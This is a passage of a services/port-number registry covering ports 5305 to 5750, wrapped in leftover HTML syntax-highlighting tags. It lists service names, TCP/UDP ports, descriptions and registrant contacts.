hacl-test       <span class="token number">5305</span>/tcp   HA Cluster Test
hacl-test       <span class="token number">5305</span>/udp   HA Cluster Test
<span class="token comment">#                          Eric Soderberg </span>
<span class="token comment">#                          Edward Yim </span>
sun-mc-grp	<span class="token number">5306</span>/tcp   Sun MC Group
sun-mc-grp	<span class="token number">5306</span>/udp   Sun MC Group
<span class="token comment">#                          Michael DeMoney </span>
sco-aip		<span class="token number">5307</span>/tcp   SCO AIP
sco-aip		<span class="token number">5307</span>/udp   SCO AIP
<span class="token comment">#			   Barrie Cooper </span>
cfengine 	<span class="token number">5308</span>/tcp   CFengine
cfengine	<span class="token number">5308</span>/udp   CFengine
<span class="token comment">#			   Mark Burgess </span>
jprinter	<span class="token number">5309</span>/tcp   J Printer
jprinter  	<span class="token number">5309</span>/udp   J Printer
<span class="token comment">#			   Ken Blackwell </span>
outlaws         <span class="token number">5310</span>/tcp   Outlaws
outlaws         <span class="token number">5310</span>/udp   Outlaws
<span class="token comment">#                          Richard Fife </span>
<span class="token comment">#               5311       Unassigned (removed 7 May 2004)</span>
permabit-cs     <span class="token number">5312</span>/tcp   Permabit Client-Server
permabit-cs     <span class="token number">5312</span>/udp   Permabit Client-Server
<span class="token comment">#                          Jered Floyd , June 2004</span>
rrdp            <span class="token number">5313</span>/tcp   Real-time <span class="token operator">&amp;</span> Reliable Data
rrdp            <span class="token number">5313</span>/udp   Real-time <span class="token operator">&amp;</span> Reliable Data
<span class="token comment">#                          Ted Hoshi , June 2004</span>
opalis-rbt-ipc  <span class="token number">5314</span>/tcp   opalis-rbt-ipc
opalis-rbt-ipc  <span class="token number">5314</span>/udp   opalis-rbt-ipc
<span class="token comment">#                          Laurent Domenech </span>
hacl-poll       <span class="token number">5315</span>/tcp   HA Cluster UDP Polling
hacl-poll       <span class="token number">5315</span>/udp   HA Cluster UDP Polling
<span class="token comment">#                          Hoa Nguyen </span>
hpdevms		<span class="token number">5316</span>/tcp   HP Device Monitor Service
hpdevms		<span class="token number">5316</span>/udp   HP Device Monitor Service
<span class="token comment">#			   Masato Maeda  04 October 2007</span>
<span class="token comment">#               5317-5319  Unassigned</span>
bsfserver-zn    <span class="token number">5320</span>/tcp   Webservices-based Zn interface of BSF
<span class="token comment">#                          Bert Paul  01 May 2008</span>
<span class="token comment">#               5320/udp   Reserved</span>
bsfsvr-zn-ssl   <span class="token number">5321</span>/tcp   Webservices-based Zn interface of BSF over SSL
<span class="token comment">#                          Bert Paul  03 July 2008</span>
<span class="token comment">#               5321/udp   Reserved</span>
<span class="token comment">#               5322-5342  Unassigned</span>
kfserver	<span class="token number">5343</span>/tcp   Sculptor Database Server
kfserver	<span class="token number">5343</span>/udp   Sculptor Database Server
<span class="token comment">#                          Keith Ashman  December 2005</span>
xkotodrcp	<span class="token number">5344</span>/tcp   xkoto DRCP
xkotodrcp	<span class="token number">5344</span>/udp   xkoto DRCP
<span class="token comment">#			   Jeff Heisz  February 2006</span>
<span class="token comment">#               5345-5348  Unassigned</span>
stuns           <span class="token number">5349</span>/tcp   STUN over TLS
stuns           <span class="token number">5349</span>/udp   Reserved <span class="token keyword">for</span> a future enhancement of STUN
<span class="token comment">#                          [RFC5389]</span>
nat-pmp-status	<span class="token number">5350</span>/tcp   NAT-PMP Status Announcements
nat-pmp-status	<span class="token number">5350</span>/udp   NAT-PMP Status Announcements
<span class="token comment">#			   Stuart Cheshire  03 December 2007</span>
nat-pmp         <span class="token number">5351</span>/tcp   NAT Port Mapping Protocol
nat-pmp         <span class="token number">5351</span>/udp   NAT Port Mapping Protocol
<span class="token comment">#                          Joshua Graessley  December 2004</span>
dns-llq         <span class="token number">5352</span>/tcp   DNS Long-Lived Queries
dns-llq         <span class="token number">5352</span>/udp   DNS Long-Lived Queries
<span class="token comment">#                          Kiren Sekar  August 2005</span>
mdns            <span class="token number">5353</span>/tcp   Multicast DNS
mdns            <span class="token number">5353</span>/udp   Multicast DNS
<span class="token comment">#                          Stuart Cheshire </span>
mdnsresponder   <span class="token number">5354</span>/tcp   Multicast DNS Responder IPC
mdnsresponder   <span class="token number">5354</span>/udp   Multicast DNS Responder IPC
<span class="token comment">#                          Stuart Cheshire  June 2004</span>
llmnr           <span class="token number">5355</span>/tcp   LLMNR
llmnr           <span class="token number">5355</span>/udp   LLMNR
<span class="token comment">#                          Bernard Aboba  June 2004</span>
ms-smlbiz       <span class="token number">5356</span>/tcp   Microsoft Small Business
ms-smlbiz       <span class="token number">5356</span>/udp   Microsoft Small Business
<span class="token comment">#                          Gopikrishna Sandra  February 2005</span>
wsdapi          <span class="token number">5357</span>/tcp   Web Services <span class="token keyword">for</span> Devices
wsdapi          <span class="token number">5357</span>/udp   Web Services <span class="token keyword">for</span> Devices
wsdapi-s        <span class="token number">5358</span>/tcp   WS <span class="token keyword">for</span> Devices Secured
wsdapi-s        <span class="token number">5358</span>/udp   WS <span class="token keyword">for</span> Devices Secured
<span class="token comment">#                          Henry Rawas  August 2005</span>
ms-alerter	<span class="token number">5359</span>/tcp   Microsoft Alerter
ms-alerter	<span class="token number">5359</span>/udp   Microsoft Alerter
<span class="token comment">#			   Marc McClure  07 August 2007</span>
ms-sideshow     <span class="token number">5360</span>/tcp   Protocol <span class="token keyword">for</span> Windows SideShow
ms-sideshow     <span class="token number">5360</span>/udp   Protocol <span class="token keyword">for</span> Windows SideShow
ms-s-sideshow   <span class="token number">5361</span>/tcp   Secure Protocol <span class="token keyword">for</span> Windows SideShow
ms-s-sideshow   <span class="token number">5361</span>/udp   Secure Protocol <span class="token keyword">for</span> Windows SideShow
<span class="token comment">#                          Dan Polivy  12 March 2008</span>
serverwsd2      <span class="token number">5362</span>/tcp   Microsoft Windows Server WSD2 Service
serverwsd2      <span class="token number">5362</span>/udp   Microsoft Windows Server WSD2 Service
<span class="token comment">#                          Erhan Soyer-Osman  26 March 2008</span>
net-projection  <span class="token number">5363</span>/tcp   Windows Network Projection
net-projection  <span class="token number">5363</span>/udp   Windows Network Projection
<span class="token comment">#                          Rob Williams  17 February 2009</span>
<span class="token comment">#     	        5364-5396  Unassigned</span>
stresstester    <span class="token number">5397</span>/tcp   StressTester<span class="token punctuation">(</span>tm<span class="token punctuation">)</span> Injector
stresstester    <span class="token number">5397</span>/udp   StressTester<span class="token punctuation">(</span>tm<span class="token punctuation">)</span> Injector
<span class="token comment">#                          Graham Parsons  August 2005</span>
elektron-admin  <span class="token number">5398</span>/tcp   Elektron Administration
elektron-admin  <span class="token number">5398</span>/udp   Elektron Administration
<span class="token comment">#                          Chris Hawk  August 2005</span>
securitychase   <span class="token number">5399</span>/tcp   SecurityChase
securitychase   <span class="token number">5399</span>/udp   SecurityChase
<span class="token comment">#                          Daisuke Shinomiya  August 2005</span>
excerpt		<span class="token number">5400</span>/tcp   Excerpt Search
excerpt		<span class="token number">5400</span>/udp   Excerpt Search
excerpts	<span class="token number">5401</span>/tcp   Excerpt Search Secure
excerpts  	<span class="token number">5401</span>/udp   Excerpt Search Secure
<span class="token comment">#		           John Hinsdale </span>
mftp		<span class="token number">5402</span>/tcp   OmniCast MFTP
mftp		<span class="token number">5402</span>/udp   OmniCast MFTP
<span class="token comment">#			   Steve Bannister </span>
hpoms-ci-lstn   <span class="token number">5403</span>/tcp   HPOMS-CI-LSTN
hpoms-ci-lstn	<span class="token number">5403</span>/udp   HPOMS-CI-LSTN
hpoms-dps-lstn  <span class="token number">5404</span>/tcp   HPOMS-DPS-LSTN
hpoms-dps-lstn  <span class="token number">5404</span>/udp   HPOMS-DPS-LSTN
<span class="token comment">#			               Harold Froehling </span>
netsupport	<span class="token number">5405</span>/tcp   NetSupport
netsupport	<span class="token number">5405</span>/udp   NetSupport
<span class="token comment">#		           Paul Sanders </span>
systemics-sox	<span class="token number">5406</span>/tcp   Systemics Sox
systemics-sox	<span class="token number">5406</span>/udp   Systemics Sox
<span class="token comment">#		           Gary Howland </span>
foresyte-clear  <span class="token number">5407</span>/tcp   Foresyte-Clear
foresyte-clear  <span class="token number">5407</span>/udp   Foresyte-Clear
foresyte-sec    <span class="token number">5408</span>/tcp   Foresyte-Sec
foresyte-sec	<span class="token number">5408</span>/udp   Foresyte-Sec
<span class="token comment">#			   Jorge Aldana </span>
salient-dtasrv  <span class="token number">5409</span>/tcp   Salient Data Server
salient-dtasrv  <span class="token number">5409</span>/udp   Salient Data Server
salient-usrmgr  <span class="token number">5410</span>/tcp   Salient User Manager
salient-usrmgr  <span class="token number">5410</span>/udp   Salient User Manager
<span class="token comment">#                          Richard Farnham </span>
actnet		<span class="token number">5411</span>/tcp   ActNet
actnet		<span class="token number">5411</span>/udp   ActNet
<span class="token comment">#		           Simon Robillard </span>
continuus	<span class="token number">5412</span>/tcp   Continuus
continuus   	<span class="token number">5412</span>/udp   Continuus
<span class="token comment">#		           Steven Holtsberg </span>
wwiotalk	<span class="token number">5413</span>/tcp   WWIOTALK
wwiotalk	<span class="token number">5413</span>/udp   WWIOTALK
<span class="token comment">#		           Roger Knobbe </span>
statusd		<span class="token number">5414</span>/tcp   StatusD
statusd		<span class="token number">5414</span>/udp   StatusD
<span class="token comment">#		           Stephen Misel </span>
ns-server  	<span class="token number">5415</span>/tcp   NS Server
ns-server	<span class="token number">5415</span>/udp   NS Server
<span class="token comment">#		           Jeffrey Chiao </span>
sns-gateway	<span class="token number">5416</span>/tcp   SNS Gateway
sns-gateway	<span class="token number">5416</span>/udp   SNS Gateway
sns-agent	<span class="token number">5417</span>/tcp   SNS Agent
sns-agent  	<span class="token number">5417</span>/udp   SNS Agent
<span class="token comment">#	    	           Mary Holstage </span>
mcntp		<span class="token number">5418</span>/tcp   MCNTP
mcntp		<span class="token number">5418</span>/udp   MCNTP
<span class="token comment">#		           Heiko Rupp </span>
dj-ice		<span class="token number">5419</span>/tcp   DJ-ICE
dj-ice		<span class="token number">5419</span>/udp   DJ-ICE
<span class="token comment">#		           Don Tyson </span>
cylink-c	<span class="token number">5420</span>/tcp   Cylink-C
cylink-c	<span class="token number">5420</span>/udp   Cylink-C
<span class="token comment">#		           John Jobe </span>
netsupport2	<span class="token number">5421</span>/tcp   Net Support <span class="token number">2</span>
netsupport2	<span class="token number">5421</span>/udp   Net Support <span class="token number">2</span>
<span class="token comment">#		           Paul Sanders </span>
salient-mux     <span class="token number">5422</span>/tcp   Salient MUX
salient-mux     <span class="token number">5422</span>/udp   Salient MUX
<span class="token comment">#                          Richard Farnham </span>
virtualuser     <span class="token number">5423</span>/tcp   VIRTUALUSER
virtualuser     <span class="token number">5423</span>/udp   VIRTUALUSER
<span class="token comment">#                          Chad Williams </span>
beyond-remote   <span class="token number">5424</span>/tcp   Beyond Remote
beyond-remote   <span class="token number">5424</span>/udp   Beyond Remote
<span class="token comment">#                          Michael Berg  November 2004</span>
br-channel      <span class="token number">5425</span>/tcp   Beyond Remote Command Channel
br-channel      <span class="token number">5425</span>/udp   Beyond Remote Command Channel
<span class="token comment">#                          Michael Berg  August 2005</span>
devbasic        <span class="token number">5426</span>/tcp   DEVBASIC
devbasic        <span class="token number">5426</span>/udp   DEVBASIC
<span class="token comment">#                          Curtis Smith </span>
sco-peer-tta    <span class="token number">5427</span>/tcp   SCO-PEER-TTA
sco-peer-tta    <span class="token number">5427</span>/udp   SCO-PEER-TTA
<span class="token comment">#                          Andrew Shire </span>
telaconsole     <span class="token number">5428</span>/tcp   TELACONSOLE
telaconsole     <span class="token number">5428</span>/udp   TELACONSOLE
<span class="token comment">#                          Joseph M. Newcomer </span>
base            <span class="token number">5429</span>/tcp   Billing and Accounting System Exchange
base            <span class="token number">5429</span>/udp   Billing and Accounting System Exchange
<span class="token comment">#                          Odo Maletzki </span>
radec-corp      <span class="token number">5430</span>/tcp   RADEC CORP
radec-corp      <span class="token number">5430</span>/udp   RADEC CORP
<span class="token comment">#                          David Chell </span>
park-agent      <span class="token number">5431</span>/tcp   PARK AGENT
park-agent      <span class="token number">5431</span>/udp   PARK AGENT
<span class="token comment">#                          John Clifford </span>
postgresql      <span class="token number">5432</span>/tcp   PostgreSQL Database
postgresql      <span class="token number">5432</span>/udp   PostgreSQL Database
<span class="token comment">#                          Tom Lane </span>
pyrrho          <span class="token number">5433</span>/tcp   Pyrrho DBMS
pyrrho          <span class="token number">5433</span>/udp   Pyrrho DBMS
<span class="token comment">#                          Malcolm Crowe  November 2005</span>
sgi-arrayd      <span class="token number">5434</span>/tcp   SGI Array Services Daemon
sgi-arrayd      <span class="token number">5434</span>/udp   SGI Array Services Daemon
<span class="token comment">#                          Karl Feind  October 2005</span>
sceanics        <span class="token number">5435</span>/tcp   SCEANICS situation and action notification
sceanics        <span class="token number">5435</span>/udp   SCEANICS situation and action notification
<span class="token comment">#                          Richard Olsen </span>
<span class="token comment">#               5436-5442  Unassigned</span>
spss            <span class="token number">5443</span>/tcp   Pearson HTTPS
spss            <span class="token number">5443</span>/udp   Pearson HTTPS
<span class="token comment">#                          Pearson  17 January 2008</span>
<span class="token comment">#               5444-5452  Unassigned</span>
surebox         <span class="token number">5453</span>/tcp   SureBox
surebox         <span class="token number">5453</span>/udp   SureBox
<span class="token comment">#                          Emin BORU  November 2004</span>
apc-5454        <span class="token number">5454</span>/tcp   APC <span class="token number">5454</span>
apc-5454        <span class="token number">5454</span>/udp   APC <span class="token number">5454</span>
apc-5455        <span class="token number">5455</span>/tcp   APC <span class="token number">5455</span>
apc-5455        <span class="token number">5455</span>/udp   APC <span class="token number">5455</span>
apc-5456        <span class="token number">5456</span>/tcp   APC <span class="token number">5456</span>
apc-5456        <span class="token number">5456</span>/udp   APC <span class="token number">5456</span>
<span class="token comment">#                          American Power Conversion </span>
<span class="token comment">#               5457-5460  Unassigned</span>
silkmeter       <span class="token number">5461</span>/tcp   SILKMETER
silkmeter       <span class="token number">5461</span>/udp   SILKMETER
<span class="token comment">#                          Klaus Fellner  </span>
ttl-publisher   <span class="token number">5462</span>/tcp   TTL Publisher
ttl-publisher   <span class="token number">5462</span>/udp   TTL Publisher
<span class="token comment">#                          Peter Jacobs </span>
ttlpriceproxy   <span class="token number">5463</span>/tcp   TTL Price Proxy
ttlpriceproxy   <span class="token number">5463</span>/udp   TTL Price Proxy
<span class="token comment">#                          Peter Jacobs </span>
quailnet	<span class="token number">5464</span>/tcp   Quail Networks Object Broker
quailnet	<span class="token number">5464</span>/udp   Quail Networks Object Broker
<span class="token comment">#			   Craig N. Bissell  April 2006</span>
netops-broker   <span class="token number">5465</span>/tcp   NETOPS-BROKER
netops-broker   <span class="token number">5465</span>/udp   NETOPS-BROKER
<span class="token comment">#                          John R. Deuel </span>
<span class="token comment">#		5466-5499  Unassigned</span>
fcp-addr-srvr1  <span class="token number">5500</span>/tcp   fcp-addr-srvr1
fcp-addr-srvr1  <span class="token number">5500</span>/udp   fcp-addr-srvr1
fcp-addr-srvr2  <span class="token number">5501</span>/tcp   fcp-addr-srvr2
fcp-addr-srvr2  <span class="token number">5501</span>/udp   fcp-addr-srvr2
fcp-srvr-inst1  <span class="token number">5502</span>/tcp   fcp-srvr-inst1
fcp-srvr-inst1  <span class="token number">5502</span>/udp   fcp-srvr-inst1
fcp-srvr-inst2  <span class="token number">5503</span>/tcp   fcp-srvr-inst2
fcp-srvr-inst2  <span class="token number">5503</span>/udp   fcp-srvr-inst2
fcp-cics-gw1    <span class="token number">5504</span>/tcp   fcp-cics-gw1
fcp-cics-gw1    <span class="token number">5504</span>/udp   fcp-cics-gw1
<span class="token comment">#			   Ken Wittmer </span>
checkoutdb	<span class="token number">5505</span>/tcp   Checkout Database
checkoutdb	<span class="token number">5505</span>/udp   Checkout Database
<span class="token comment">#			   Dirk Stoop  April 2007</span>
<span class="token comment">#               5506-5552  Unassigned</span>
sgi-eventmond   <span class="token number">5553</span>/tcp   SGI Eventmond Port
sgi-eventmond   <span class="token number">5553</span>/udp   SGI Eventmond Port
<span class="token comment">#                          Andrei Vilkotski  June 2003</span>
sgi-esphttp     <span class="token number">5554</span>/tcp   SGI ESP HTTP
sgi-esphttp     <span class="token number">5554</span>/udp   SGI ESP HTTP
<span class="token comment">#                          Vladimir Legalov </span>
<span class="token comment">###UNAUTHORIZED USE: Port 5555 also used by HP Omniback############</span>
<span class="token comment">###UNAUTHORIZED USE: port 5555 by Intermec UDPPlus#################</span>
personal-agent  <span class="token number">5555</span>/tcp   Personal Agent
personal-agent  <span class="token number">5555</span>/udp   Personal Agent
<span class="token comment">#			               Jackie Wu </span>
<span class="token comment">###################################################################</span>
freeciv         <span class="token number">5556</span>/tcp   Freeciv gameplay
freeciv         <span class="token number">5556</span>/udp   Freeciv gameplay
<span class="token comment">#			   Reinier Post, Paul Zastoupil  January 2006</span>
<span class="token comment">#		5557-5565  Unassigned</span>
westec-connect  <span class="token number">5566</span>/tcp   Westec Connect
<span class="token comment">#                          Previous contact: Kaushlesh Chandel  03 March 2009</span>
<span class="token comment">#                          Current contact: Jon Bolen  18 March 2009</span>
<span class="token comment">#               5566/udp   Unassigned</span>
m-oap		<span class="token number">5567</span>/tcp   Multicast Object Access Protocol
m-oap		<span class="token number">5567</span>/udp   Multicast Object Access Protocol
<span class="token comment">#                          Bryant Eastham  November 2004</span>
sdt		<span class="token number">5568</span>/tcp   Session Data Transport Multicast
sdt		<span class="token number">5568</span>/udp   Session Data Transport Multicast
<span class="token comment">#			   Daniel W. Antonuk  May 2006</span>
<span class="token comment">#               5569-5572  Unassigned</span>
sdmmp		<span class="token number">5573</span>/tcp   SAS Domain Management Messaging Protocol
sdmmp		<span class="token number">5573</span>/udp   SAS Domain Management Messaging Protocol
<span class="token comment">#			   Ron Zuckerman  30 August 2007</span>
lsi-bobcat      <span class="token number">5574</span>/tcp   SAS IO Forwarding
<span class="token comment">#                          Mandar Joshi  09 February 2009</span>
<span class="token comment">#               5574/udp   Reserved</span>
<span class="token comment">#               5575-5578  Unassigned</span>
fdtracks        <span class="token number">5579</span>/tcp   FleetDisplay Tracking Service
<span class="token comment">#                          Henrik Woffinden  22 September 2008</span>
<span class="token comment">#               5579/udp   Unassigned</span>
tmosms0		<span class="token number">5580</span>/tcp   T-Mobile SMS Protocol Message <span class="token number">0</span>
tmosms0		<span class="token number">5580</span>/udp   T-Mobile SMS Protocol Message <span class="token number">0</span>
tmosms1		<span class="token number">5581</span>/tcp   T-Mobile SMS Protocol Message <span class="token number">1</span>
tmosms1		<span class="token number">5581</span>/udp   T-Mobile SMS Protocol Message <span class="token number">1</span>
<span class="token comment">#			   Ezinne Oji  June 2006</span>
fac-restore     <span class="token number">5582</span>/tcp   T-Mobile SMS Protocol Message <span class="token number">3</span>
fac-restore     <span class="token number">5582</span>/udp   T-Mobile SMS Protocol Message <span class="token number">3</span>
<span class="token comment">#                          Jessica Yan  19 February 2008</span>
tmo-icon-sync   <span class="token number">5583</span>/tcp   T-Mobile SMS Protocol Message <span class="token number">2</span>
tmo-icon-sync   <span class="token number">5583</span>/udp   T-Mobile SMS Protocol Message <span class="token number">2</span>
<span class="token comment">#                          Donghwan Lim  22 January 2008</span>
bis-web         <span class="token number">5584</span>/tcp   BeInSync-Web
bis-web         <span class="token number">5584</span>/udp   BeInSync-Web
bis-sync        <span class="token number">5585</span>/tcp   BeInSync-sync
bis-sync        <span class="token number">5585</span>/udp   BeInSync-sync
<span class="token comment">#                          Adi Ruppin  August 2005</span>
<span class="token comment">#               5586-5596  Unassigned</span>
ininmessaging   <span class="token number">5597</span>/tcp   inin secure messaging
ininmessaging   <span class="token number">5597</span>/udp   inin secure messaging
<span class="token comment">#			   Mike Gagle  May 2006</span>
mctfeed		<span class="token number">5598</span>/tcp   MCT Market Data Feed
mctfeed		<span class="token number">5598</span>/udp   MCT Market Data Feed
<span class="token comment">#			   Stephane Touizer  May 2006</span>
esinstall	<span class="token number">5599</span>/tcp   Enterprise Security Remote Install
esinstall	<span class="token number">5599</span>/udp   Enterprise Security Remote Install
esmmanager 	<span class="token number">5600</span>/tcp   Enterprise Security Manager
esmmanager	<span class="token number">5600</span>/udp   Enterprise Security Manager
esmagent	<span class="token number">5601</span>/tcp   Enterprise Security Agent
esmagent   	<span class="token number">5601</span>/udp   Enterprise Security Agent
<span class="token comment">#		           Kimberly Gibbs </span>
a1-msc		<span class="token number">5602</span>/tcp   A1-MSC
a1-msc		<span class="token number">5602</span>/udp   A1-MSC
a1-bs		<span class="token number">5603</span>/tcp   A1-BS
a1-bs  		<span class="token number">5603</span>/udp   A1-BS
a3-sdunode	<span class="token number">5604</span>/tcp   A3-SDUNode
a3-sdunode	<span class="token number">5604</span>/udp   A3-SDUNode
a4-sdunode	<span class="token number">5605</span>/tcp   A4-SDUNode
a4-sdunode	<span class="token number">5605</span>/udp   A4-SDUNode
<span class="token comment">#		           Mike Dolan </span>
<span class="token comment">#               5606-5626  Unassigned</span>
ninaf		<span class="token number">5627</span>/tcp   Node Initiated Network Association Forma
ninaf		<span class="token number">5627</span>/udp   Node Initiated Network Association Forma
<span class="token comment">#			   Thomas Scholl  March 2006</span>
htrust          <span class="token number">5628</span>/tcp   HTrust API
htrust          <span class="token number">5628</span>/udp   HTrust API
<span class="token comment">#                          Karl Olafsson  24 October 2008</span>
symantec-sfdb	<span class="token number">5629</span>/tcp   Symantec Storage Foundation <span class="token keyword">for</span> Database
symantec-sfdb	<span class="token number">5629</span>/udp   Symantec Storage Foundation <span class="token keyword">for</span> Database
<span class="token comment">#			   Quang Thoi  November 2006</span>
precise-comm	<span class="token number">5630</span>/tcp   PreciseCommunication
precise-comm	<span class="token number">5630</span>/udp   PreciseCommunication
<span class="token comment">#			   Alon Tamir  April 2006</span>
pcanywheredata  <span class="token number">5631</span>/tcp   pcANYWHEREdata
pcanywheredata  <span class="token number">5631</span>/udp   pcANYWHEREdata
pcanywherestat  <span class="token number">5632</span>/tcp   pcANYWHEREstat
pcanywherestat  <span class="token number">5632</span>/udp   pcANYWHEREstat
<span class="token comment">#                          Jon Rosarky </span>
beorl           <span class="token number">5633</span>/tcp   BE Operations Request Listener
beorl           <span class="token number">5633</span>/udp   BE Operations Request Listener
<span class="token comment">#			   chirag desai  February 2006</span>
xprtld		<span class="token number">5634</span>/tcp   SF Message Service
xprtld		<span class="token number">5634</span>/udp   SF Message Service
<span class="token comment">#			   VR Satish  16 August 2007</span>
sfmsso          <span class="token number">5635</span>/tcp   SFM Authentication Subsystem
<span class="token comment">#                          De-Chih Chien  15 September 2008</span>
<span class="token comment">#               5635/udp   Reserved</span>
sfm-db-server   <span class="token number">5636</span>/tcp   SFMdb - SFM DB server
<span class="token comment">#                          De-Chih Chien  06 October 2008</span>
<span class="token comment">#               5636/udp   Reserved</span>
<span class="token comment">#               5637-5670  Unassigned</span>
amqps           <span class="token number">5671</span>/tcp   amqp protocol over TLS/SSL
amqps           <span class="token number">5671</span>/udp   amqp protocol over TLS/SSL
<span class="token comment">#                          Ted Ross  26 March 2008</span>
amqp		<span class="token number">5672</span>/tcp   AMQP
amqp		<span class="token number">5672</span>/udp   AMQP
<span class="token comment">#			   Pieter Hintjens  January 2006</span>
amqp		<span class="token number">5672</span>/sctp  AMQP
<span class="token comment">#			   Martin Sustrik  March 2007</span>
jms             <span class="token number">5673</span>/tcp   JACL Message Server
jms             <span class="token number">5673</span>/udp   JACL Message Server
<span class="token comment">#                          Stuart Allen  February 2002</span>
hyperscsi-port  <span class="token number">5674</span>/tcp   HyperSCSI Port
hyperscsi-port  <span class="token number">5674</span>/udp   HyperSCSI Port
<span class="token comment">#                          Data Storage Institute, Singapore</span>
<span class="token comment">#                           February 2002</span>
v5ua            <span class="token number">5675</span>/tcp   V5UA application port
v5ua            <span class="token number">5675</span>/udp   V5UA application port
v5ua            <span class="token number">5675</span>/sctp  V5UA application port
<span class="token comment">#                          RFC3807 June 2004</span>
raadmin         <span class="token number">5676</span>/tcp   RA Administration
raadmin         <span class="token number">5676</span>/udp   RA Administration
<span class="token comment">#                          Sergei Zjaikin  February 2002</span>
questdb2-lnchr  <span class="token number">5677</span>/tcp   Quest Central DB2 Launchr
questdb2-lnchr  <span class="token number">5677</span>/udp   Quest Central DB2 Launchr
<span class="token comment">#                          Robert M. Mackowiak  February 2002</span>
rrac            <span class="token number">5678</span>/tcp   Remote Replication Agent Connection
rrac            <span class="token number">5678</span>/udp   Remote Replication Agent Connection
dccm            <span class="token number">5679</span>/tcp   Direct Cable Connect Manager
dccm            <span class="token number">5679</span>/udp   Direct Cable Connect Manager
<span class="token comment">#                          Mark Miller </span>
auriga-router   <span class="token number">5680</span>/tcp   Auriga Router Service
auriga-router   <span class="token number">5680</span>/udp   Auriga Router Service
<span class="token comment">#			   Vincent Gaudeul  February 2006</span>
ncxcp 		<span class="token number">5681</span>/tcp   Net-coneX Control Protocol
ncxcp 		<span class="token number">5681</span>/udp   Net-coneX Control Protocol
<span class="token comment">#			   Ryan Werber  June 2006</span>
<span class="token comment">#               5682-5687  Unassigned</span>
ggz             <span class="token number">5688</span>/tcp   GGZ Gaming Zone
ggz             <span class="token number">5688</span>/udp   GGZ Gaming Zone
<span class="token comment">#                          Josef Spillner  January 2003</span>
qmvideo		<span class="token number">5689</span>/tcp   QM video network management protocol
qmvideo		<span class="token number">5689</span>/udp   QM video network management protocol
<span class="token comment">#			   Jamie Lokier  May 2006</span>
<span class="token comment">#               5690-5712  Unassigned</span>
proshareaudio   <span class="token number">5713</span>/tcp   proshare conf audio
proshareaudio   <span class="token number">5713</span>/udp   proshare conf audio
prosharevideo   <span class="token number">5714</span>/tcp   proshare conf video
prosharevideo   <span class="token number">5714</span>/udp   proshare conf video
prosharedata    <span class="token number">5715</span>/tcp   proshare conf data
prosharedata    <span class="token number">5715</span>/udp   proshare conf data
prosharerequest <span class="token number">5716</span>/tcp   proshare conf request
prosharerequest <span class="token number">5716</span>/udp   proshare conf request
prosharenotify  <span class="token number">5717</span>/tcp   proshare conf notify
prosharenotify  <span class="token number">5717</span>/udp   proshare conf notify
<span class="token comment">#                          </span>
dpm		<span class="token number">5718</span>/tcp   DPM Communication Server
dpm		<span class="token number">5718</span>/udp   DPM Communication Server
dpm-agent	<span class="token number">5719</span>/tcp   DPM Agent Coordinator
dpm-agent	<span class="token number">5719</span>/udp   DPM Agent Coordinator
<span class="token comment">#			   Sundar Srinivasan  Vinay Badami  May 2006</span>
ms-licensing    <span class="token number">5720</span>/tcp   MS-Licensing
ms-licensing    <span class="token number">5720</span>/udp   MS-Licensing
<span class="token comment">#                          Thomas Lindeman  November 2002</span>
dtpt            <span class="token number">5721</span>/tcp   Desktop Passthru Service
dtpt            <span class="token number">5721</span>/udp   Desktop Passthru Service
<span class="token comment">#                          Dan Leising  January 2005</span>
msdfsr		<span class="token number">5722</span>/tcp   Microsoft DFS Replication Service
msdfsr		<span class="token number">5722</span>/udp   Microsoft DFS Replication Service
<span class="token comment">#			   Guhan Suriyanarayanan  March 2006</span>
omhs		<span class="token number">5723</span>/tcp   Operations Manager - Health Service
omhs		<span class="token number">5723</span>/udp   Operations Manager - Health Service
omsdk		<span class="token number">5724</span>/tcp   Operations Manager - SDK Service
omsdk		<span class="token number">5724</span>/udp   Operations Manager - SDK Service
<span class="token comment">#			   Gerardo Dilillo  August 2006</span>
ms-ilm          <span class="token number">5725</span>/tcp   Microsoft Identity Lifecycle Manager
<span class="token comment">#               5725/udp   Reserved</span>
<span class="token comment">#                          Rob Ward  02 May 2008</span>
ms-ilm-sts      <span class="token number">5726</span>/tcp   Microsoft Lifecycle Manager Secure Token Service
<span class="token comment">#               5726/udp   Reserved</span>
<span class="token comment">#                          Rob Ward  02 May 2008</span>
asgenf          <span class="token number">5727</span>/tcp   ASG Event Notification Framework
<span class="token comment">#                          Arman Bedonian  15 July 2009</span>
<span class="token comment">#               5727/udp   Reserved</span>
<span class="token comment">#               5728-5728  Unassigned</span>
openmail        <span class="token number">5729</span>/tcp   Openmail User Agent Layer
openmail        <span class="token number">5729</span>/udp   Openmail User Agent Layer
<span class="token comment">#                          OpenMail Encyclopedia </span>
<span class="token comment">#                          Don Loughry </span>
unieng          <span class="token number">5730</span>/tcp   Steltor<span class="token string">'s calendar access
unieng          5730/udp   Steltor'</span>s calendar access
<span class="token comment">#                          Bernard Desruisseaux </span>
<span class="token comment">#               5731-5740  Unassigned</span>
ida-discover1   <span class="token number">5741</span>/tcp   IDA Discover Port <span class="token number">1</span>
ida-discover1   <span class="token number">5741</span>/udp   IDA Discover Port <span class="token number">1</span>
ida-discover2   <span class="token number">5742</span>/tcp   IDA Discover Port <span class="token number">2</span>
ida-discover2   <span class="token number">5742</span>/udp   IDA Discover Port <span class="token number">2</span>
<span class="token comment">#                          MPITech Support </span>
watchdoc-pod    <span class="token number">5743</span>/tcp   Watchdoc NetPOD Protocol
watchdoc-pod    <span class="token number">5743</span>/udp   Watchdoc NetPOD Protocol
<span class="token comment">#                          Christophe Chevalier  August 2005</span>
watchdoc        <span class="token number">5744</span>/tcp   Watchdoc Server
watchdoc        <span class="token number">5744</span>/udp   Watchdoc Server
<span class="token comment">#                          Christophe Chevalier  November 2004</span>
fcopy-server    <span class="token number">5745</span>/tcp   fcopy-server
fcopy-server    <span class="token number">5745</span>/udp   fcopy-server
fcopys-server   <span class="token number">5746</span>/tcp   fcopys-server
fcopys-server   <span class="token number">5746</span>/udp   fcopys-server
<span class="token comment">#                          Moshe Leibovitch </span>
tunatic         <span class="token number">5747</span>/tcp   Wildbits Tunatic
tunatic         <span class="token number">5747</span>/udp   Wildbits Tunatic
tunalyzer       <span class="token number">5748</span>/tcp   Wildbits Tunalyzer
tunalyzer       <span class="token number">5748</span>/udp   Wildbits Tunalyzer
<span class="token comment">#                          Sylvain Demongeot  August 2005</span>
<span class="token comment">#               5749       Unassigned</span>
rscd            <span class="token number">5750</span>/tcp   Bladelogic Agent Service
rscd            <span class="token number">5750</span>/udp   Bladelogic Agent Service
